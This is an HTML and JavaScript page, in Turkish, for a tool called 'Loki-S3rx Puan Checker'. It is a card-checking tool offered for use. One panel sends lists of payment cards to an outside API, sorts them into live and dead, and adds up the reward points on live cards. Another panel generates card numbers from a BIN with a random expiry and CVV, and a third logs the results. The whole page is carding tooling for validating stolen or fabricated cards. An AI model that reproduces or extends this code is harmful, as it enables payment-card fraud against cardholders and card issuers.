<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Loki-S3rx Puan Checker</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;600&display=swap');

body {
    margin:0;
    background:#0d0d12;
    font-family:'Chakra Petch',sans-serif;
    color:white;
}

.bg-vid {
    position:fixed; top:0; left:0;
    width:100%; height:100%;
    object-fit:cover;
    z-index:-2; opacity:.40;
}

.sidebar {
    position:fixed; left:0; top:0;
    width:240px; height:100vh;
    background:rgba(20,20,35,0.65);
    backdrop-filter:blur(14px);
    border-right:1px solid rgba(180,0,255,0.4);
    padding-top:35px;
}
.sidebar h2 {
    text-align:center;
    font-size:20px;
    color:#d986ff;
    text-shadow:0 0 10px #c84bff;
}
.menu-btn {
    padding:15px;
    margin:12px;
    border-radius:10px;
    background:rgba(255,255,255,0.06);
    text-align:center;
    cursor:pointer;
    border:1px solid rgba(180,0,255,0.4);
    transition:.25s;
}
.menu-btn:hover {
    background:rgba(180,0,255,0.25);
}

.main {
    margin-left:260px;
    padding:25px;
    height:100vh;
    overflow-y:auto;
}

.panel {
    display:none;
    max-width:900px;
    margin:auto;
    background:rgba(255,255,255,0.08);
    padding:25px;
    border-radius:16px;
    border:1px solid rgba(200,100,255,0.22);
    box-shadow:0 0 25px rgba(200,100,255,0.18);
    backdrop-filter:blur(9px);
}
.panel.active { display:block; }

textarea, input {
    width:100%;
    background:rgba(0,0,0,0.4);
    border:1px solid rgba(180,0,255,0.4);
    border-radius:10px;
    padding:12px;
    color:white;
    font-family:monospace;
}

button {
    width:100%;
    padding:14px;
    margin-top:10px;
    border:0;
    border-radius:10px;
    font-weight:600;
    background:#d86cff;
    color:black;
    cursor:pointer;
    transition:.2s;
}
button:hover {
    background:#c24dff;
}

.list-box {
    display:flex;
    gap:20px;
    margin-top:20px;
}
.col {
    flex:1;
    background:rgba(0,0,0,0.35);
    padding:14px;
    border-radius:12px;
    border:1px solid rgba(255,255,255,0.15);
    max-height:420px;
    overflow-y:auto;
}
.live-item {
    background:rgba(120,255,190,0.20);
    border-left:4px solid #3bffbb;
    padding:10px;
    margin-bottom:10px;
    border-radius:8px;
    box-shadow:0 0 15px #24ffbc9a;
}
.dead-item {
    background:rgba(255,80,110,0.18);
    border-left:4px solid #ff4c6d;
    padding:10px;
    margin-bottom:10px;
    border-radius:8px;
    box-shadow:0 0 15px #ff41679a;
}

#logBox {
    width:100%;
    height:300px;
    background:rgba(0,0,0,0.5);
    border:1px solid rgba(180,0,255,0.4);
    border-radius:10px;
    padding:10px;
    color:#dcaaff;
    overflow-y:auto;
}
.badge {
    padding:8px 14px;
    border-radius:10px;
    background:rgba(150,0,255,0.25);
    display:inline-block;
    margin-bottom:12px;
}
</style>
</head>

<body>

<video class="bg-vid" autoplay muted loop>
<source src="https://cdn.coverr.co/videos/coverr-rain-on-window-1445/1080p.mp4" type="video/mp4">
</video>

<div class="sidebar">
    <h2>Loki-S3rx Checker</h2>
    <div class="menu-btn" onclick="showPanel('checker')">Puan Checker</div>
    <div class="menu-btn" onclick="showPanel('generator')">CC Generator</div>
    <div class="menu-btn" onclick="showPanel('logs')">Loglar</div>
</div>

<div class="main">

<!-- PUAN CHECKER -->
<div id="checker" class="panel active">
    <h2>Puan Checker</h2>

    <textarea id="cards" rows="8" placeholder="Kartları alt alta yaz:"></textarea>
    <button id="startBtn">Kontrol Başlat</button>
    <button id="stopBtn" disabled>Durdur</button>

    <div class="badge" id="totalPoints">Toplam Puan: 0</div>

    <div class="list-box">
        <div class="col">
            <h3 style="color:#adffde">LIVE Kartlar</h3>
            <div id="liveList"></div>
        </div>
        <div class="col">
            <h3 style="color:#ffb3c6">DEAD Kartlar</h3>
            <div id="deadList"></div>
        </div>
    </div>
</div>

<!-- GENERATOR -->
<div id="generator" class="panel">
    <h2>CC Generator</h2>
    <input id="bin" placeholder="BIN" />
    <input id="month" placeholder="Ay" />
    <input id="year" placeholder="Yıl" />
    <input id="cvv" placeholder="CVV" />
    <input id="amount" placeholder="Adet" />
    <button onclick="generateCC()">Generate</button>
    <textarea id="genResult" rows="10"></textarea>
</div>

<!-- LOGS -->
<div id="logs" class="panel">
    <h2>Log Kayıtları</h2>
    <textarea id="logBox" readonly></textarea>
</div>

</div>

<script>
// PANEL GEÇİŞ
function showPanel(id){
    document.querySelectorAll(".panel").forEach(p=>p.classList.remove("active"));
    document.getElementById(id).classList.add("active");
}

// START CHECK ------------------------------------------------------------
document.getElementById("startBtn").addEventListener("click", startCheck);
document.getElementById("stopBtn").addEventListener("click", ()=> window.abortCheck = true);

async function startCheck(){
    const btn = document.getElementById("startBtn");
    const stop = document.getElementById("stopBtn");

    btn.disabled = true;
    stop.disabled = false;
    btn.innerText = "⏳ Bekle kanks… kontrol ediliyor…";

    const lines = document.getElementById("cards").value.trim().split("\n").filter(x=>x);
    window.abortCheck = false;

    const liveList = document.getElementById("liveList");
    const deadList = document.getElementById("deadList");
    const logBox = document.getElementById("logBox");
    const totalPoints = document.getElementById("totalPoints");

    liveList.innerHTML = "";
    deadList.innerHTML = "";
    totalPoints.innerText = "Toplam Puan: 0";

    let sum = 0;

    for(const card of lines){
        if(window.abortCheck) break;

        const r = await fetch("https://oxyincxapi.alwaysdata.net/check/ownerapi.php?kart=" + encodeURIComponent(card));
        const t = await r.text();

        let isLive = t.toLowerCase().includes("live") || t.toLowerCase().includes("puan");
        let puanMatch = t.match(/([0-9]+(?:[.,][0-9]+)?)/);
        let puan = puanMatch ? Number(puanMatch[0].replace(",", ".")) : 0;



        if(isLive){
            sum += puan;
            liveList.innerHTML += `
                <div class="live-item">
                    <b>${card}</b><br>
                    Puan: ${puan}
                </div>`;
            logBox.value = `[LIVE] ${card} | ${puan}\n` + logBox.value;
        } else {
            deadList.innerHTML += `
                <div class="dead-item">
                    <b>${card}</b><br>
                    DEAD
                </div>`;
            logBox.value = `[DEAD] ${card}\n` + logBox.value;
        }

        totalPoints.innerText = "Toplam Puan: " + sum;
        await new Promise(r=>setTimeout(r,200));
    }

    btn.disabled = false;
    stop.disabled = true;
    btn.innerText = "Kontrol Başlat";
}

// GENERATOR ---------------------------------------------------------------
function generateCC(){
    let bin=document.getElementById("bin").value;
    let month=document.getElementById("month").value || String(Math.floor(Math.random()*12)+1).padStart(2,'0');
    let year=document.getElementById("year").value || "29";
    let cvv=document.getElementById("cvv").value || String(Math.floor(Math.random()*900)+100);
    let amount=parseInt(document.getElementById("amount").value);
    let out="";

    for(let i=0;i<amount;i++){
        let cc = bin + Math.random().toString().slice(2).padStart(16-bin.length,'0');
        out += `${cc}|${month}|${year}|${cvv}\n`;
    }
    document.getElementById("genResult").value = out;
}
</script>

</body>
</html>
